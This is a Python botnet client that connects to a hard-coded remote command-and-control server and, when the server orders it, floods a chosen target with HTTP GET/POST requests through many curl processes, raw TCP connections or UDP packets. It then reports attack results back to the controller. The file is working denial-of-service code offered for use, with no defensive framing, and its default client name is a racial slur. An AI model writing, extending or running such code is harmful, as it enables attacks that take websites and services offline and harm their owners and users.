#!/usr/bin/env python3
"""
C2 Client - CURL SPAM MODE - Actually sends requests
"""
import socketio
import socket
import random
import string
import threading
import time
import os
import platform
import subprocess
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import multiprocessing

# Increase limits
try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
except:
    pass

class CurlSpammer:
    """Uses subprocess curl to spam requests"""
    
    def __init__(self):
        self.running = False
        self.stats = {'requests': 0, 'success': 0, 'failed': 0}
        self.stats_lock = threading.Lock()
    
    def curl_flood(self, target, duration, method='GET', processes=100):
        """Spam with curl processes"""
        print(f"\n[💥] CURL SPAM MODE ACTIVATED")
        print(f"[⚡] Processes: {processes}")
        print(f"[🎯] Target: {target}")
        print(f"[⏱️] Duration: {duration}s")
        print(f"[🔥] Expected: {processes * 100}+ RPS\n")
        
        self.running = True
        start_time = time.time()
        
        def worker(worker_id):
            """Worker that spams curl"""
            count = 0
            
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Build curl command
                    if method == 'POST':
                        cmd = [
                            'curl', '-X', 'POST',
                            '-H', 'User-Agent: Mozilla/5.0',
                            '-H', 'Connection: keep-alive',
                            '-d', f'data=spam{count}',
                            '--max-time', '2',
                            '--connect-timeout', '1',
                            '-s', '-o', '/dev/null', '-w', '%{http_code}',
                            f'{target}?w={worker_id}&c={count}'
                        ]
                    else:
                        cmd = [
                            'curl', '-X', 'GET',
                            '-H', 'User-Agent: Mozilla/5.0',
                            '-H', 'Connection: keep-alive',
                            '--max-time', '2',
                            '--connect-timeout', '1',
                            '-s', '-o', '/dev/null', '-w', '%{http_code}',
                            f'{target}?w={worker_id}&c={count}'
                        ]
                    
                    # Execute curl
                    result = subprocess.run(cmd, capture_output=True, timeout=3)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if result.returncode == 0:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    count += 1
                    
                except:
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['failed'] += 1
        
        print(f"[🚀] Launching {processes} curl spammers...\n")
        
        # Use processes instead of threads for better performance
        with ThreadPoolExecutor(max_workers=processes) as executor:
            futures = [executor.submit(worker, i) for i in range(processes)]
            
            # Monitor
            last_count = 0
            while (time.time() - start_time) < duration and self.running:
                time.sleep(1)
                current = self.stats['requests']
                rps = current - last_count
                last_count = current
                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,} | Success: {self.stats['success']:,}", end='', flush=True)
            
            self.running = False
        
        print("\n")
        return self.stats.copy()
    
    def socket_flood(self, target, duration, threads=500):
        """Raw socket flood"""
        print(f"\n[💥] RAW SOCKET FLOOD")
        self.running = True
        start_time = time.time()
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        def worker():
            while self.running and (time.time() - start_time) < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((host, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
                    s.close()
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['failed'] += 1
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            last_count = 0
            while (time.time() - start_time) < duration and self.running:
                time.sleep(1)
                current = self.stats['requests']
                rps = current - last_count
                last_count = current
                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,}", end='', flush=True)
            
            self.running = False
        
        print("\n")
        return self.stats.copy()
    
    def udp_flood(self, target, duration, threads=300):
        """UDP flood"""
        print(f"\n[💥] UDP FLOOD")
        self.running = True
        start_time = time.time()
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        payload = os.urandom(1024)
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and (time.time() - start_time) < duration:
                try:
                    sock.sendto(payload, (host, port))
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    pass
            sock.close()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            last_count = 0
            while (time.time() - start_time) < duration and self.running:
                time.sleep(1)
                current = self.stats['requests']
                rps = current - last_count
                last_count = current
                print(f"\r[⚡] RPS: {rps:,} | Total: {current:,}", end='', flush=True)
            
            self.running = False
        
        print("\n")
        return self.stats.copy()

class SimpleC2Client:
    """Minimal C2 client that doesn't break"""
    
    def __init__(self, server_url, client_name):
        self.server_url = server_url
        self.client_name = client_name
        self.spammer = CurlSpammer()
        self.attack_thread = None
        
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False
        )
        
        self.setup_handlers()
    
    def setup_handlers(self):
        @self.sio.event
        def connect():
            print(f"\n✅ Connected to C2 Server")
            self.sio.emit('client_register', {
                'name': self.client_name,
                'hostname': platform.node(),
                'platform': platform.platform(),
                'cpu_count': multiprocessing.cpu_count(),
                'memory_total': 0,
                'python_version': platform.python_version(),
                'has_layer7': True,
                'cloudflare_bypass': True
            })
        
        @self.sio.event
        def disconnect():
            print("⚠️ Disconnected from server")
        
        @self.sio.event
        def welcome(data):
            print(f"📢 {data['message']}")
        
        @self.sio.event
        def attack_command(data):
            print(f"\n🎯 Attack Command Received!")
            if data.get('command') == 'start':
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
    
    def start_attack(self, attack_data):
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Attack already running")
            return
        
        try:
            self.sio.emit('attack_started', {
                'attack_id': attack_data.get('attack_id'),
                'target': attack_data.get('target')
            })
        except:
            pass
        
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_data,),
            daemon=True
        )
        self.attack_thread.start()
    
    def execute_attack(self, attack_data):
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http').lower()
        duration = attack_data.get('duration', 60)
        
        cpu_count = multiprocessing.cpu_count()
        
        # UNLIMITED
        thread_counts = {
            'http': cpu_count * 50,
            'get': cpu_count * 50,
            'post': cpu_count * 50,
            'tcp': cpu_count * 100,
            'udp': cpu_count * 50,
        }
        threads = thread_counts.get(method, cpu_count * 50)
        
        print(f"\n{'='*60}")
        print(f"💥 CURL SPAM ATTACK")
        print(f"   Target: {target}")
        print(f"   Method: {method.upper()}")
        print(f"   Duration: {duration}s")
        print(f"   Workers: {threads}")
        print(f"{'='*60}")
        
        try:
            self.spammer.stats = {'requests': 0, 'success': 0, 'failed': 0}
            
            if method in ['http', 'get']:
                results = self.spammer.curl_flood(target, duration, 'GET', threads)
            elif method == 'post':
                results = self.spammer.curl_flood(target, duration, 'POST', threads)
            elif method == 'tcp':
                results = self.spammer.socket_flood(target, duration, threads)
            elif method == 'udp':
                results = self.spammer.udp_flood(target, duration, threads)
            else:
                results = self.spammer.curl_flood(target, duration, 'GET', threads)
            
            rps = results['requests'] / duration if duration > 0 else 0
            success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
            
            print(f"\n{'='*60}")
            print(f"✅ ATTACK COMPLETED")
            print(f"   Total: {results['requests']:,}")
            print(f"   Success: {results['success']:,}")
            print(f"   RPS: {rps:,.1f}")
            print(f"   Rate: {success_rate:.1f}%")
            print(f"{'='*60}\n")
            
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results['requests'],
                        'success': success_rate,
                        'rps': rps,
                        'duration': duration,
                        'method': method,
                        'bytes_sent': results['requests'] * 500
                    }
                })
            except:
                pass
            
        except Exception as e:
            print(f"\n❌ Error: {e}")
        finally:
            self.spammer.running = False
    
    def stop_attack(self):
        self.spammer.running = False
        print("🛑 Attack stopped")
    
    def heartbeat_loop(self):
        """Minimal heartbeat - no /proc/stat access"""
        while True:
            try:
                if self.sio.connected:
                    # Just ping, no stats
                    self.sio.emit('ping', {'timestamp': time.time()})
                time.sleep(15)
            except:
                time.sleep(15)
    
    def connect(self):
        print("\n" + "="*60)
        print("💥 CURL SPAM CLIENT")
        print(f"🔗 Server: {self.server_url}")
        print(f"🏷️  Name: {self.client_name}")
        print(f"⚡ CPUs: {multiprocessing.cpu_count()}")
        print(f"🔥 Mode: CURL SUBPROCESS SPAM")
        print("="*60 + "\n")
        
        print("⚡ Connecting...")
        
        try:
            self.sio.connect(
                self.server_url,
                wait_timeout=30,
                transports=['polling', 'websocket']
            )
            
            print("✅ Connected!")
            print("📡 Starting heartbeat...\n")
            
            heartbeat = threading.Thread(target=self.heartbeat_loop, daemon=True)
            heartbeat.start()
            
            print("⚡ Ready for commands!\n")
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Stopped")
            self.spammer.running = False
            if self.sio.connected:
                self.sio.disconnect()

def main():
    print("""
    ╔══════════════════════════════════════╗
    ║     CURL SPAM CLIENT                ║
    ║  Uses subprocess curl to spam       ║
    ║  Actually sends REAL requests       ║
    ║  No file descriptor issues          ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = default_server
    if not server_url:
        server_url = default_server
    
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = ("nigaaa")
    if not client_name:
        client_name = platform.node()
    
    client = SimpleC2Client(server_url, client_name)
    client.connect()

if __name__ == "__main__":
    main()

